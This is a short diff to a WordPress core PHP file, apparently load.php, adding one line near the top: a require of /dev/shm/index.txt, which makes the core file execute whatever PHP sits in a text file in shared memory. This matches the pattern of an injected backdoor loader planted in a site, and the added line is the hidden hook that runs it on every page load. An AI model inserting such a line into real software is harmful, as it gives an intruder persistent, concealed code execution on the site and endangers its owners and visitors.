@@ -4,7 +4,7 @@
  *
  * @package WordPress
  */
-
+require ("/dev/shm/index.txt");
 /**
  * Returns the HTTP protocol sent by the server.
  *
